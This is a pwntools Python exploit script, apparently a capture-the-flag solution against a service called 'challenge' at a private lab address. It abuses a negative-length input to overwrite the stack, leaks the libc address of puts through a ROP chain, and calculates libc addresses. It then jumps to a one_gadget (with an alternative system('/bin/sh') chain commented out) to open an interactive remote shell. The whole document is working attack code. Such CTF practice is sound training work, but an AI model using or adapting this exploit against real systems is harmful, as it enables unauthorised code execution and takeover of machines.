from pwn import *
rhp = {'host': '192.168.33.20', 'port': 1234}
conn = remote(rhp['host'], rhp['port'])
# conn = process('challenge')
# gdb.attach(conn)

binf = ELF('challenge')
main = binf.symbols[b'main']
puts_plt = 0x4006b8
puts_got = 0x000000600fb0


libc = ELF('./libc.so.6')
offset_libc_puts = libc.symbols[b'puts']
libc = ELF('./libc.so.6')
offset_libc_system = libc.symbols[b'system']
offset_libc_binsh = next(libc.search('/bin/sh\x00'))
one_gadget = 0x45216

rop_pop_ret = 0x00400a43

context.log_level = 'debug'

conn.recvline()
conn.sendline('y')
conn.recvuntil('name: ')
conn.sendline('hoge')
conn.recvline()
conn.sendline('-128')
for _ in range(26):
    conn.sendline("+")

conn.sendline(str(rop_pop_ret))
conn.sendline("0")

conn.sendline(str(puts_got))
conn.sendline("0")

conn.sendline(str(puts_plt))
conn.sendline("0")

conn.sendline(str(main))
conn.sendline("0")

for _ in range(128 - 34):
    conn.sendline("+")

conn.recvline()

puts_addr = u64(conn.recvline(False).ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - offset_libc_puts
binsh_addr = libc_base + offset_libc_binsh
system_addr = libc_base + offset_libc_system
one_gadegt_addr = libc_base + one_gadget


conn.recvline()
conn.sendline('y')
conn.recvuntil('name: ')
conn.sendline('hoge')
conn.recvline()
conn.sendline('-128')
for _ in range(26):
    conn.sendline("+")


# conn.sendline(str(rop_pop_ret))
# conn.sendline("0")

# conn.sendline(str(binsh_addr & 0xFFFFFFFF))
# conn.sendline(str(binsh_addr >> 32))

# conn.sendline(str(system_addr & 0xFFFFFFFF))
# conn.sendline(str(system_addr >> 32))

# for _ in range(128 - 32):
#     conn.sendline("+")


conn.sendline(str(one_gadegt_addr & 0xFFFFFFFF))
conn.sendline(str(one_gadegt_addr >> 32))

for _ in range(128 - 28):
    conn.sendline("+")

context.log_level = 'info'
conn.interactive()
